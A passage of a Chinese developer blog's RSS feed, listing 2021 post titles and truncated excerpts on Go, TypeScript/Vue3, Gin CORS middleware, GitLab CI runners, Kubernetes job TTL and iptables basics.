&amp;#34;bip&amp;#34;: &amp;#34;169.253.32.1/24&amp;#34;, &amp;#34;data-root&amp;#34;: &amp;#34;/data/docker/var/lib/docker&amp;#34; } 上述配置， 对 docker.io 的镜像加速效果很好， 但对 google 镜像的加速效果就很差了比如k8s相关的以gcr.io或quay.io开头的镜像地址。 这个时候可以</description></item><item><title>typescript 将 json 序列化为 querystring 格式</title><link>https://tangx.in/posts/2021/09/29/typescript-convert-json-to-querystring/</link><pubDate>Wed, 29 Sep 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/09/29/typescript-convert-json-to-querystring/</guid><description>typescript 将 json 序列化为 querystring 格式 使用 typescript 时， 需要同时安装 @types/qs 和 qs 1 yarn add @types/qs qs demo 1 2 3 4 5 6 7 8 9 const params = qs.stringify({ namespace: namespace, replicas: replicas, }) const u = `/deployments/${name}/replicas?${params}` console.log(&amp;#34;Uuuuu::::&amp;#34;, u); // Uuuuu:::: /deployments/failed-nginx/replicas?namespace=default&amp;amp;replicas=3</description></item><item><title>vue3 安装 vue-router 支持</title><link>https://tangx.in/posts/2021/09/28/vue3-vue-router/</link><pubDate>Tue, 28 Sep 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/09/28/vue3-vue-router/</guid><description>安装 vue-router 路由支持 在 vue3 中使用的是 vue-router@next 版本 ^4.y.z 1 yarn add vue-router@next /src/router/index.ts 创建路由规则 安装之后， 在创建文件 /src/router/index.ts 作为 vue-router 的初始化文件。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 // 导入创建路由所需的组件 import { createRouter, createWebHistory } from &amp;#34;vue-router&amp;#34;; // 路由目标组件 import HelloWorld from &amp;#39;../components/HelloWorld.vue&amp;#39; import World from &amp;#39;../components/World.vue&amp;#39; // 路由表 const routes = [ { path: &amp;#34;/helloworld&amp;#34;, name: &amp;#34;HelloWorld&amp;#34;, component: HelloWorld }, { path: &amp;#34;/world&amp;#34;, name: &amp;#34;World&amp;#34;, component: World } ] // 创</description></item><item><title>vue3 使用 @ 路径别名</title><link>https://tangx.in/posts/2021/09/28/vue3-with-alias-path/</link><pubDate>Tue, 28 Sep 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/09/28/vue3-with-alias-path/</guid><description>使用 @ 路径别名 在使用 import 的时候， 可以使用相对路径 ../components/HelloWorld.vue 指定文件位置， 但这依赖文件本身的位置，在 跨目录 的时候， 并不方便。 例如， 路由文件 要使用 Components 组件 1 2 3 4 // file: /src/router/index.ts // 路由目标组件 import HelloWorld from &amp;#39;../components/HelloWorld.vue&amp;#39; import World from &amp;#39;../components/World.vue&amp;#39; 要使用路径别名， 需要进行一些额外配置 安装 @types/node 支持 安装 @types/node 组件 1 yarn add @types/node 在 tsconfig.json 中， compilerOptions 下配置 1 2 3 4 5 6 7 8 9</description></item><item><title>gin 内部重定向时 middleware 不可用异常</title><link>https://tangx.in/posts/2021/09/27/gin-301-redirect-slash-cause-cors-error/</link><pubDate>Mon, 27 Sep 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/09/27/gin-301-redirect-slash-cause-cors-error/</guid><description>gin 内部重定向时 middleware 不可用异常 axios 请求时出现 cors error 在使用 axios 请求后端时，遇到 cors 跨域问题， 虽然已经在 gin 中添加了 cors 的 middleware 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 func cors() gin.HandlerFunc { return func(c *gin.Context) { method := c.Request.Method origin := &amp;#34;*&amp;#34; if method != &amp;#34;&amp;#34; { c.Header(&amp;#34;Access-Control-Allow-Origin&amp;#34;, origin) // 可将将 * 替换为指定的域名 c.Header(&amp;#34;Access-Control-Allow-Methods&amp;#34;, &amp;#34;POST, GET, OPTIONS, PUT, DELETE, UPDATE&amp;#34;) c.Header(&amp;#34;Access-Control-Allow-Headers&amp;#34;, &amp;#34;Origin, X-Requested-With, Content-Type, Accept, Authorization,X-Token&amp;#34;) c.Header(&amp;#34;Access-Control-Expose-Headers&amp;#34;, &amp;#34;Content-Length, Access-Control-Allow-Origin, Access-Control-Allow-Headers, Cache-Control, Content-Language, Content-Type&amp;#34;) c.Header(&amp;#34;Access-Control-Allow-Credentials&amp;#34;, &amp;#34;true&amp;#34;) } if method == &amp;#34;OPTIONS&amp;#34; { c.AbortWithStatus(http.StatusNoContent) } } } 问题原因 gin Middleware</description></item><item><title>K8S 使用 TTL 控制器自动清理完成的 job pod</title><link>https://tangx.in/posts/2021/09/23/k8s-ttl-seconds-after-finished-forbidden/</link><pubDate>Thu, 23 Sep 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/09/23/k8s-ttl-seconds-after-finished-forbidden/</guid><description>K8S 使用 TTL 控制器自动清理完成的 Job Pod 最近为集群 CI 默认添加了 .spec.ttlSecondsAfterFinished 参数， 以便在 cronjob 和 job 运行完成后自动清理过期 pod 。 但是在 CI 的时候却失败， 报错如下。 1 spec.jobTemplate.spec.ttlSecondsAfterFinished: Forbidden: disabled by feature-gate 核查资料得知， 在 v1.21 之前， 该开关默认是关闭的。 刚好错误集群低于此版本。 Job TTL 控制器 K8S 提供了一个 TTL 控制器， 可以自动在 JOB Complete 或 Failed 之后， 经过一定时间</description></item><item><title>golang 反射</title><link>https://tangx.in/posts/2021/09/22/golang-reflect/</link><pubDate>Wed, 22 Sep 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/09/22/golang-reflect/</guid><description>golang 反射 golang 反射很好用， 也有很多坑。 代码在: https://github.com/tangx-labs/golang-reflect-demo Kind 和 Type 在 golang 的反射中， 有两个可以表示 类型 的关键字， Kind 和 Type 。 定义覆盖范围 Kind 的定义覆盖范围必 Type 要大。 Kind 在定义上要 更抽象， Type 要更具体。 可以简单理解为， 如果 Kind 是 车 ， 那么 Type 可能是 公交车 、 消防车 内置类型字面值 https://github.com/tangx-labs/golang-reflect-demo/blob/master/kind_type_test.go#L10 虽然 Kind 的定义比 Type 要大， 但是在 内置 类型的时候</description></item><item><title>在 golang 中 slice[a :b :c] 是什么意思? golang slice 完整表达式</title><link>https://tangx.in/posts/2021/09/22/golang-slice-expressions/</link><pubDate>Wed, 22 Sep 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/09/22/golang-slice-expressions/</guid><description>golang slice 表达式 https://golang.org/ref/spec#Slice_expressions 通常，我们写的 golang slice 边界只有两个数字 slice[1:3] ， 这是一种简单写法。 而完整写法是 三个数字 slice[1:3:5] 简单表达式 一个冒号， 两个参数， 表示 slice 元素的 起止区间 1 a[low:high] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package main import ( &amp;#34;fmt&amp;#34; ) func main() { a := [5]int{1, 2, 3, 4, 5} s := a[1:4] // [2,3,4] fmt.Println(s) s1 := a[2:] // 等价于 a[2 : len(a) s2 := a[:3] // 等价于 a[0 : 3] s3 := a[:] // 等价于</description></item><item><title>gitlab shell runner</title><link>https://tangx.in/posts/2021/09/18/gitlab-shell-runner/</link><pubDate>Sat, 18 Sep 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/09/18/gitlab-shell-runner/</guid><description>快速创建 gitlab shell runner 真没想道有一天， 我居然会创建 gitlab shell runner 。 环境太难管理了 创建 gitlab shell runner 实话实说， gitlab 现在的用户体验太好了。 根本不需要到处去搜文档，直接在 runner 管理界面就可以找到， 还贴心的给你准备了全套， 一键复制粘贴搞定。 https://git.example.com/admin/runners 点击 Show Runner installation instructions 可以看到多种 runner 的配置。 在默认的基础上， 根据实际情况优化一下。 1 2</description></item><item><title>golang 使用反射绑定 cobra flag 参数</title><link>https://tangx.in/posts/2021/09/18/golang-cobra-flag-binder/</link><pubDate>Sat, 18 Sep 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/09/18/golang-cobra-flag-binder/</guid><description>golang 使用反射绑定 cobra flag 参数 cobra https://github.com/spf13/cobra 是 golang 中一个非常好用的 命令 开发库。 但是绑定 flag 参数的时候略微有点繁琐， 不但有多少个参数就需要写多少行绑定代码， 而且参数定义和描述也是分开的， 非常的不直观。 1 2 3 4 5 6 func init() { rootCmd.Flags().StringVarP(&amp;amp;stu.Name, &amp;#34;name&amp;#34;, &amp;#34;&amp;#34;, &amp;#34;zhangsanfeng&amp;#34;, &amp;#34;student name&amp;#34;) rootCmd.Flags().Int64VarP(&amp;amp;stu.Age, &amp;#34;age&amp;#34;, &amp;#34;a&amp;#34;, 18, &amp;#34;student age&amp;#34;) // ... } 想着吧， 反正都要了解 golang reflect 反射, 不如就用 反射 实现一个绑定支</description></item><item><title>go-jarvis 容器化 go 应用开发配置管理利器</title><link>https://tangx.in/posts/2021/09/17/go-jarvis-config-manager/</link><pubDate>Fri, 17 Sep 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/09/17/go-jarvis-config-manager/</guid><description>go-jarvis/jarivs 为了方便 golang 容器化开发的时候管理配置。 核心功能 根据 config 结构体生成 yaml 配置文件 程序启动时， 从 yaml 配置文件和 环境变量 中对 config 赋值 执行逻辑 根据配置 config{} 生成对应的 default.yml 配置文件。 读取依次配置文件 default.yml, config.yml + 分支配置文件.yml + 环境变量 根据 GitlabCI, 分支配置文件 config.xxxx.yml 如没有 CI, 读取本地文件: local.yml 使用需求 config 对象中的结构体中，</description></item><item><title>docker runner 配置编译环境的大文件依赖</title><link>https://tangx.in/posts/2021/09/10/gitlab-docker-runner-with-huge-build-dependence-files/</link><pubDate>Fri, 10 Sep 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/09/10/gitlab-docker-runner-with-huge-build-dependence-files/</guid><description>docker runner 配置编译环境的大文件依赖 需求简介： 现在要做某个 arm 平台的的交叉编译环境， 交叉编译依赖和工具包大小 5G 左右， 特别大。 如果按照以往的方式， 直接将 编译依赖和工具 直接打包到编译镜像中， 会有很多麻烦。 单 layer 过大 docker 单层 layer 限制为 5G。 镜像升级迭代 浪费空间 。 如果镜像上层升级或者依赖变化， 整个 layer 不能</description></item><item><title>gitlab-runner-build not found in path</title><link>https://tangx.in/posts/2021/09/10/gitlab-runner-build-not-found-in-path/</link><pubDate>Fri, 10 Sep 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/09/10/gitlab-runner-build-not-found-in-path/</guid><description>&amp;quot;gitlab-runner-build&amp;quot;: executable file not found in $PATH 在搭建 gitlab-runner 的过程中，报错如下 1 ERROR: Job failed (system failure): prepare environment: Error response from daemon: OCI runtime create failed: container_linux.go:370: starting container process caused: exec: &amp;#34;gitlab-runner-build&amp;#34;: executable file not found in $PATH: unknown (exec.go:57:0s). Check https://docs.gitlab.com/runner/shells/index.html#shell-profile-loading for more information 因为在 environment 中 扩展了 PATH 而导致 gitlab-runner-helper 中的 PATH 出现了异常。 从而导致 gitlab-runner-build 这个脚本（命令） 无法被找到。 原因分析 在 gitlab 的定义中 environment 的行为有两种 ， append(扩展) 或 overwrite(覆盖)。</description></item><item><title>GET 请求也能传递 JSON Body</title><link>https://tangx.in/posts/2021/09/09/ginbinder-allow-get-accept-body-data/</link><pubDate>Thu, 09 Sep 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/09/09/ginbinder-allow-get-accept-body-data/</guid><description>GET 请求也能传递 Body 数据 通常而言， GET 请求很少传递 Body 数据， 大多情况下都是放在 url 中， 例如 1 http://example.com/api?key1=value1&amp;amp;key2=value2 但是这样做， 可能由于 传递数据过多 导致 URL 过程而被拦截。 运营商会缓存 URL 地址以达到加速的效果， 而有些参数又不想被缓存。 等等 虽然， 可以使用 POST 请求代替 GET 请求， 在 Body 中传递数据， 但是这样做可能会破坏 RESTful 风格的 API 格</description></item><item><title>golang 括号用法总结</title><link>https://tangx.in/posts/2021/09/09/golang-brackets/</link><pubDate>Thu, 09 Sep 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/09/09/golang-brackets/</guid><description>golang 括号用法总结 1 2 3 4 5 6 7 8 var ( f unsafe.Pointer a io.ReadCloser = (*os.File)(f) // 只要是一个指针就可以 b io.Reader = a // a的方法集大于等于b，就可以做隐式的转换！ c io.Closer = a // 同样 d io.Reader = c.(io.Reader) // 显式转换，c这个接口很明显方法集和io.Reader不同 // 但是万一传入c的对象拥有io.Reader接口呢？比如 ) 提问， 以上这些括号都是</description></item><item><title>axios get 请求携带 body 数据</title><link>https://tangx.in/posts/2021/09/07/typescript-axios-get-request-with-body-data/</link><pubDate>Tue, 07 Sep 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/09/07/typescript-axios-get-request-with-body-data/</guid><description>axios get 请求携带 json body 数据 在 http 标准协议中， GET 请求 本身是可以携带 Body 数据 。 至于 GET 请求携带的数据能不能被获取， 还是要看接受端 后端 是否处理。 在 gin-gonic/gin 框架中， GET 请求默认就不会处理 body 中的数据， 只能通过 query 表单数据传递。 然而不同的浏览器对于 URL 长度的限制也不同，一般是 1024 个字符， 1. 有些时候需要携带的数据可能超</description></item><item><title>如果 golang map 值不能修改怎么办？</title><link>https://tangx.in/posts/2021/09/07/golang-map-struct-value-modify/</link><pubDate>Tue, 07 Sep 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/09/07/golang-map-struct-value-modify/</guid><description>值对象与指针对象 假设有一个 map 对象 map[string]Person ， 其中 Person 定义如下。 是一个 struct 1 2 3 type Person struct { Age int } 现在有一个需求， map 中的 Person 对象年龄为 0 ， 则将其默认值设置为 18。 很显然， 由于 map[string]Person 中保存的是 值对象 ，因此通过任意方式获取的都是 值对象的副本 ， 所有修改都是在副本上， 不能 修改真实值。 如果是 map[string]*Person 就很方便了。 *Person 是 指针</description></item><item><title>GitlabCI 使用多个 Runner 执行特定 JOB</title><link>https://tangx.in/posts/2021/09/06/gitlab-ci-under-multiple-runners/</link><pubDate>Mon, 06 Sep 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/09/06/gitlab-ci-under-multiple-runners/</guid><description>GitlabCI 使用多个 Runner 执行特定 JOB 在 Gitlab CI 中，Runner 是 Job 的执行器， 也就是说 Job 的运行环境， 就是 Runner 的环境。 那么， 怎么将同一个 gitlab ci 中的 Job 运行在不同的 Runner 上呢？ 例如， 根据 操作系统 区分， job1 运行在 windows 上， job2 运行在 linux 上， 诸如此类。 使用 TAG 指定 runner 其实很简单， gitlab ci 中， 可以通过指定 tags 来设定运行条件， 满足了 tag 才能被</description></item><item><title>golang 中的环境变量操作</title><link>https://tangx.in/posts/2021/09/06/golang-os-env-operation/</link><pubDate>Mon, 06 Sep 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/09/06/golang-os-env-operation/</guid><description>golang 中的环境变量操作 golang 中的环境变量操作都在 os 包下面， 只有很少的几个， 而且字面意思也很明确。 所有环境变量操作对象都是 字符串 (string)， 因此对于 int， bool 类型需要自己实现转换。 golang 程序执行的时候， 是在 linux 系统中 fork 的一种子进程中 golang程序 在 复制了 fork 时 （开始运行的那一瞬间）的所有变</description></item><item><title>typora 定义 github pages 专属配置</title><link>https://tangx.in/posts/2021/09/02/typora-borned-for-github-page/</link><pubDate>Thu, 02 Sep 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/09/02/typora-borned-for-github-page/</guid><description>typora ， 可以说一款为 github pages 网站量身定制的软件 配置初始目录 在 配置中 选择 General ， 选择默认打开的目录。 配置图片路径 众所周知， Github Pages(Jekyll) 中， 文章需要放到 _post 下， 而资源应该另外创建目录， 如 assert 等。 这就造成了普通 markdown 编辑器插入图片的不方便。 解决方法如下： 使用图床， 彻底外部独立， 不存在相对路径的问题 放在 assert 下面， 但本</description></item><item><title>typescript vue3 项目容器化实战</title><link>https://tangx.in/posts/2021/09/01/typescript-for-of-interface-and-assert-keyof-type/</link><pubDate>Wed, 01 Sep 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/09/01/typescript-for-of-interface-and-assert-keyof-type/</guid><description>typescript vue3 项目容器化实战 在前端容器化的时候， 有一个绕不开的问题： 容器返回的后端地址应该怎么设置。 静态编译到所有文件中， 肯定是不可取的， 总不能后端变更一个访问域名，前端都要重新构建一次镜像吧？ 由于 js (typescript 编译后 ) 实际是运行在 用户的浏览器上， 所以也不能像后端一样读取环境变量。 所以， 通过 html &amp;lt;meta&amp;gt; 标签</description></item><item><title>typescript 中使用 @ 路径别名</title><link>https://tangx.in/posts/2021/09/01/typescript-use-alias-path/</link><pubDate>Wed, 01 Sep 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/09/01/typescript-use-alias-path/</guid><description>typescript 中使用 @ 路径别名 使用路径别名 @/some/path/index.ts 可以很简单的表示一个文件的绝对路径（其实是相对于 @ 的相对路径） 安装 @types/node 1 yarn add @types/node 配置 tsconfig.json , 一下是基于 vite2 项目配置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 { &amp;#34;compilerOptions&amp;#34;: { // ... , &amp;#34;types&amp;#34;: [ &amp;#34;node&amp;#34; ], // https://github.com/vitejs/vite/issues/279 &amp;#34;paths&amp;#34;: { &amp;#34;@/*&amp;#34;: [ &amp;#34;./src/*&amp;#34;, ] } }, // ... } 就可以在 ts 文件中使用 @ 别名引入了。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17</description></item><item><title>vue3 使用 vite2 初始化项目</title><link>https://tangx.in/posts/2021/08/31/vue3-vite2-initial/</link><pubDate>Tue, 31 Aug 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/08/31/vue3-vite2-initial/</guid><description>vue3 使用 vite2 初始化项目 vue3 + vite2 + typescript 配置 使用 vite2 创建项目 1 2 3 4 5 6 # 交换式 yarn create vite # 非交互式 yarn create vite project-name --template vue-ts 创建项目之后， cd project-name 进入项目， 是用 yarn 安装依赖， 使用 yarn dev 运行程序。 安装 less 支持 less 是 css 的一个超集。 yarn add less 安装之后， 可以在 CompName.vue 中使用 less 语法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // CompName.vue &amp;lt;template&amp;gt; &amp;lt;div class=&amp;#34;div1&amp;#34;&amp;gt; &amp;lt;h3&amp;gt;div1&amp;lt;/h3&amp;gt; &amp;lt;div class=&amp;#34;div2&amp;#34;&amp;gt; &amp;lt;h3&amp;gt;div2&amp;lt;/h3&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/template&amp;gt;</description></item><item><title>一道 golang 切片面试题</title><link>https://tangx.in/posts/2021/08/30/golang-array-and-slice/</link><pubDate>Mon, 30 Aug 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/08/30/golang-array-and-slice/</guid><description>一道 golang 切片面试题 为什么 sl[:5] 会返回底层数组的数据呢？ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 package main import &amp;#34;fmt&amp;#34; func main() { sl := make([]int, 0, 10) appendFn := func(s []int) { // 值传递， s 并不是 sl。 // 但数组是引用类型， 所以可以修改底层数组 fmt.Println(&amp;#34;s ptr(old):&amp;#34;, s) // [] s = append(s, 10, 20, 30) fmt.Println(&amp;#34;s ptr(new):&amp;#34;, s) // [10,20,30] } fmt.Println(sl) // [] appendFn(sl) fmt.Println(sl) // [] // 这里有点坑， 并不是取的 sl ，而是底</description></item><item><title>golang 下划线完成对象的接口类型检查</title><link>https://tangx.in/posts/2021/08/26/golang-varible-decleare-with-blank-identifier/</link><pubDate>Thu, 26 Aug 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/08/26/golang-varible-decleare-with-blank-identifier/</guid><description>golang 下划线完成对象的接口类型检查 在 Gin 源码中 有一行代码如下 1 var _ IRouter = &amp;amp;RouterGroup{} 乍一看， 是一个 赋值 操作， 但是前面又使用了 空白描述符(下划线) 。 这是什么意思呢？ 答案是： 接口类型检查 在 《Effective GO》 Interface Check 中的描述有相关描述。 全文如下。 One place this situation arises is when it is necessary to guarantee within the package implementing the type that it actually satisfies the interface. If a type-for</description></item><item><title>typescript 中的 const 断言</title><link>https://tangx.in/posts/2021/08/26/typescript-const-assertions/</link><pubDate>Thu, 26 Aug 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/08/26/typescript-const-assertions/</guid><description>typescript 中的 const assertions const assertions - TypeScript 3.4 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // vue3 const dnsProviders = { &amp;#34;aliyun.com&amp;#34;: &amp;#34;alidns&amp;#34;, &amp;#34;tencent.com&amp;#34;: &amp;#34;dnspod&amp;#34; } let data = reactive({ rootDomain: &amp;#34;aliyun.com&amp;#34; as const }) let dnsProvider = computed( () =&amp;gt; { return dnsProviders[data.rootDomain] } ) 这个时候会， 提示 7053 错误， data.rootDomain 具有 any type, 不能被用作 key。 解决这个问题使用， 需要使用 typescript 中 const assertion 类型推断。 const assertion 类型推断。 字面量类型推断: 其类型为字面值类型。 例如这里的 hello 的类型是</description></item><item><title>typescript 中的时间处理</title><link>https://tangx.in/posts/2021/08/25/typescript-time-operation/</link><pubDate>Wed, 25 Aug 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/08/25/typescript-time-operation/</guid><description>typescript 中的时间处理 在 typescript/ javasctipt 中， 时间 是一个 构造 函数， 需要通过 const dt = new Date(xxx) 进行初始化创建时间对象。 创建时间对象 1 2 3 4 5 6 7 8 9 10 // 获取当前时间对象 const now = new Date() // 将字符串时间转换为 Date 时间对象 const timeStr = &amp;#39;2021-08-23T02:42:17Z&amp;#39; const dt = new Date(timeStr) // 根据数字创建时间 const dt2 = new Date(Date.UTC(2006, 0, 2, 15, 4, 5)); console.log(&amp;#34;event:::&amp;#34;, dt2); 时间操作 获取时间对象的属性值 通过 getXXX() 方法， 可以</description></item><item><title>golang 中的时间处理</title><link>https://tangx.in/posts/2021/08/23/golang-time-operation/</link><pubDate>Mon, 23 Aug 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/08/23/golang-time-operation/</guid><description>golang 中的时间处理 在 golang 中有一个很重要的 格式化时间的字符串 2006-01-02T15:04:05Z07:00 ， 这个也是 golang 默认时间模版模版中的 time.RFC3339 1 RFC3339 = &amp;#34;2006-01-02T15:04:05Z07:00&amp;#34; golang 中关于时间的处理， 用到了上面的 每一个 数字和字母。 需要特别注意的是， 时区用的是 7 而非 6 ， 因为 6 已经在 年（2006） 中出现了 创建时间对象 time.Time 1 2 3 4 5 6 7 8 9 10 // 1. 创建当前时间对象 now := time.Now() //</description></item><item><title>ginbinder 的书写过程-一起来看gin源码吧</title><link>https://tangx.in/posts/2021/08/20/ginbinder-how-to-develop/</link><pubDate>Fri, 20 Aug 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/08/20/ginbinder-how-to-develop/</guid><description>ginbind 的实现过程-一起来看gin源码吧 是的，没错。 如果你用过 gin 那么你一定知道，gin 中绑定参数的方式很零散。 c *gon.Context 给你提供了很多中方法， 例如BindHeader, BindURI 等等， 但是如果想要绑定 reqeust 中不同地方的参数， 那对不起咯，并没有。 另外， gin 中的 Bind 接口， 默认是包含了 参数验证 validate 功能的， 因此如果你</description></item><item><title>ginbinder 一次绑定所有 request 参数</title><link>https://tangx.in/posts/2021/08/19/ginbinder/</link><pubDate>Thu, 19 Aug 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/08/19/ginbinder/</guid><description>ginbinder 一次绑定 Request 中所有需要的数据 Usage 废弃/不可用: 弃用原生 tag form tag。 保持: 使用 tag uri 绑定路径中的参数。 作用于某个字段 就是 example.com/:some/:path 中 冒号后面的 保持: 使用 tag header 绑定 header。 作用于某个字段 新增: 新增 tag query tag 绑定通过 Query 传递的参数。 作用于某个字段 就是 example.com/some/path?a=1&amp;amp;b=2 中 问号后面的那一串 新增: 新增 tag cookie 绑定 cookie 中 简单 的键</description></item><item><title>go1.17泛型尝鲜</title><link>https://tangx.in/posts/2021/08/18/go117-generic-preview/</link><pubDate>Wed, 18 Aug 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/08/18/go117-generic-preview/</guid><description>go1.17 泛型尝鲜 语法格式如下， 需要使用 [T Ttype] 指定约束条件， 例如 [T any] 不做任何约束, [T MyInterface] 满足 MyInterface 的约束 接下来我们将尝试上述提到的内容。 1 2 3 func fname[T Ttype](args []T) T { // statement } 需要注意的是， 现在泛型在 go1.17 中依旧不是正式支持， 所以在 IDE 或者编辑器上会有报错。 编译需要指定额外的 -gcflags=-G=3 参数 1 go run -gcflags=-G=3 main.go 开始吧 不约束 any 首先，我们来</description></item><item><title>golang gin 使用 context 实现 ioc</title><link>https://tangx.in/posts/2021/07/28/ioc-by-gin-context/</link><pubDate>Wed, 28 Jul 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/07/28/ioc-by-gin-context/</guid><description>golang gin 使用 context 实现 ioc gin 是一个流行的 golang webserver 的框架。 https://github.com/gin-gonic/gin gin 中 HandlerFunc (type HandlerFunc func(*Context)) 的使用随处可见, ex. Middleware , Handler 中。 1 2 3 4 router.GET(&amp;#34;/user/:name&amp;#34;, func(c *gin.Context) { name := c.Param(&amp;#34;name&amp;#34;) c.String(http.StatusOK, &amp;#34;Hello %s&amp;#34;, name) }) 因此，根据之前 golang context 实现 IoC 容器经验， 使用 *gin.Context 作为 IoC 容器再好不过了。 标准库 context.Context 是一个接口(interface)， gin.Context 是 gin 工程自己封装的的一个 struct， 并实现了该接口。 虽然</description></item><item><title>golang 使用 Context 实现 IoC 容器</title><link>https://tangx.in/posts/2021/07/27/ioc-by-golang-context/</link><pubDate>Tue, 27 Jul 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/07/27/ioc-by-golang-context/</guid><description>golang 使用 Context 实现 IoC 容器 参考文章 控制反转（IoC）与依赖注入（DI） 指出了依赖注入可以降低程序的耦合性。 能更好的拆分功能与基础设施。 那么在 golang 中又怎么实现呢？ 代码地址 golang-context-ioc.go 实现了一个 MysqlDriver 实现我们所有的数据存取操作。 并在全局域中实例化了一个对象 my。 在 main.go 中创建了一个 ctx := context.Background() 使用使用 ctx 作为 IoC 容器， 使</description></item><item><title>分支删除触发 gitlab CI</title><link>https://tangx.in/posts/2021/06/30/gitlab-ci-trigger-when-branch-deleted/</link><pubDate>Wed, 30 Jun 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/06/30/gitlab-ci-trigger-when-branch-deleted/</guid><description>分支删除触发 gitlab CI 使用 environment , 在 gitlab branch 被删除的时候，触发 CI Stopping an environment 尝试在 JOB A 中申明一个变量，并停止。 使用 on_stop action 动作, 在删除分支时(同时删除变量), 触发运行 JOB B Stop an environment when a branch is deleted Stop an environment when a branch is deleted GitLab 在 CI 中配置一个 环境变量 , 当 branch 被删除的时候清理该 环境变量， 触发 on_stop 动作， 需求。 随后这段代码是节选，在 delpoy_action job</description></item><item><title>netfilter-五链四表 - 为什么服务器没有监听 80 端口却被k3s占用了</title><link>https://tangx.in/posts/2021/06/27/k3s-and-netfilter/</link><pubDate>Sun, 27 Jun 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/06/27/k3s-and-netfilter/</guid><description>netfilter 五链四表 - 为什么服务器没有监听 80 端口却被k3s占用了 其实标题已经给出答案了。 希望大家都能夯实基础， 万事逃不过一个 道理和规则 。 现象 一天，发现服务器上 80 端口不能正常访问了， 无论怎么都是 404 page not found 。 这就奇怪了。 ssh 登录终端， 查看端口监听情况, nginx 服务器启动的好端端的在那里？ 1 2 3 4 5 netstat -tunpl |grep</description></item><item><title>iptables详解：iptables概念</title><link>https://tangx.in/posts/2021/06/25/linux-iptable-introduce/</link><pubDate>Fri, 25 Jun 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/06/25/linux-iptable-introduce/</guid><description>iptables详解：iptables概念 原文作者: 朱双印 原文链接: https://www.zsythink.net/archives/1199 这篇文章会尽量以通俗易懂的方式描述iptables的相关概念，请耐心的读完它。 防火墙相关概念 此处先描述一些相关概念。 从逻辑上讲。防火墙可以大体分为主机防火墙和网络防火墙。 主机防火墙：针对于单个主机进行防护。 网络</description></item><item><title>Golang Block 到底是什么？ 怎么就能解决闭包变量冲突了？</title><link>https://tangx.in/posts/2021/06/22/golang-block/</link><pubDate>Tue, 22 Jun 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/06/22/golang-block/</guid><description>Golang Block 到底是什么？ 怎么就能解决闭包变量冲突了？ 什么？ 你告诉我 i:=i 不仅合法，而且还常用。甚至能解决并发编程中的变量冲突？ 以下这段代码出自 golang 官方 的 Effective GO 并发编程章节。 为了解决 goroute 中变量 req 冲突， 使用了语句 req := req https://golang.org/doc/effective_go#concurrency 1 2 3 4 5 6 7 8 9 10 func Serve(queue chan *Request) { for req := range queue { req := req // Create new instance of req for the goroutine. sem &amp;lt;- 1 go func() { process(req) &amp;lt;-sem</description></item><item><title>Golang知识点(defer): 面试经常变量在 defer 中的值， 其实在问变量的作用域</title><link>https://tangx.in/posts/2021/06/21/golang-defer-func-variables-scope/</link><pubDate>Mon, 21 Jun 2021 00:00:00 +0000</pubDate><guid>https://tangx.in/posts/2021/06/21/golang-defer-func-variables-scope/</guid><description>变量在 defer 中的值， 其实在问变量的作用域 有没有想过， 面试中经常问的 变量在 defer 之后的值， 其实是在问 函数变量的作用域 简单的说， defer 就是将当前操作放入 堆 中， 等待触发 return 的时候再拿出来执行。 符合堆的特色， 先进后出。 从细节来了， 还需要注意 变量 在 defer 中的 作用域 ？ 函数 的 执行操作 是在 入堆前还是后 ？ defer 中的函数</description></item><item><title>dnsx - 一款支持多解析商的命令行 dnsx 